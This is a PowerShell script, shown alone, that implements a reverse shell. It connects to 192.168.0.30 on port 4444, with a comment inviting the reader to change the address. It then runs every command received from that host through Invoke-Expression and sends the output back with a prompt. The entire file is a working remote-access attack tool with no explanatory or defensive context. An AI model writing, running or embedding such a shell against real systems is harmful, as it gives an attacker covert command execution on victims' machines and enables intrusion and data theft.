try {
    $client = New-Object System.Net.Sockets.TCPClient("192.168.0.30", 4444) # Change IP and port
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding

    $writer.WriteLine("Connection established")
    $writer.Flush()

    while ($client.Connected) {
        $writer.Flush()
        $read = $stream.Read($buffer, 0, $buffer.Length)
        if ($read -le 0) { break }
        $out = ($encoding.GetString($buffer, 0, $read)).Trim()
        if (![string]::IsNullOrEmpty($out)) {
            $result = (Invoke-Expression -Command $out 2>&1 | Out-String)
            $result2 = $result + "PS " + (Get-Location).Path + "> "
            $writer.Write($encoding.GetBytes($result2), 0, $result2.Length)
        }
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $client.Close()
}
catch {
    Write-Output "Error: $_"
}